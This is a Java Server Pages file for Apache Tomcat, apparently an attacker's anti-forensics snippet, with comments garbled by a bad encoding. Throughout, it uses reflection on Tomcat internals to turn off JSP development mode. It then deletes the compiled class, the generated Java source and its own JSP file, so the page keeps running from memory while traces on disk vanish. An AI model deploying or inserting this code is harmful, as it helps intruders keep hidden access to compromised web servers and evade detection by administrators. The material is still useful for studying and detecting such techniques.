<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.jasper.EmbeddedServletOptions" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%@ page import="java.io.File" %>
<%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%
    //��request�����л�ȡrequest����
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);
    //��ȡMappingData
    MappingData mappingData = req.getMappingData();
    //��ȡWrapper
    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
    //��ȡjspServlet����
    Field instanceF = wrapper.getClass().getDeclaredField("instance");
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);
    //��ȡoptions�б���Ķ���
    Field Option = jspServlet.getClass().getDeclaredField("options");
    Option.setAccessible(true);
    EmbeddedServletOptions op = (EmbeddedServletOptions) Option.get(jspServlet);
    //����development����Ϊfalse
    Field Developent = op.getClass().getDeclaredField("development");
    Developent.setAccessible(true);
    Developent.set(op,false);

    //��ȡrctxt����
    Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");
    rctxt.setAccessible(true);
    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);
    //��ȡjsps��������
    Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
    jspsF.setAccessible(true);
    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
    //��ȡ��Ӧ��JspServletWrapper
    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
    //��ȡctxt���Ա����JspCompilationContext����
    Field ctxt = jsw.getClass().getDeclaredField("ctxt");
    ctxt.setAccessible(true);
    JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);
    File targetFile;
    targetFile = new File(jspCompContext.getClassFileName());//ɾ��jsp��.class
    targetFile.delete();
    targetFile = new File(jspCompContext.getServletJavaFileName());//ɾ��jsp��java�ļ�
    targetFile.delete();
    //ɾ��JSP�ļ�
    String __jspName = this.getClass().getSimpleName().replaceAll("_", ".");
    String path=application.getRealPath(__jspName);
    File file = new File(path);
    file.delete();
%>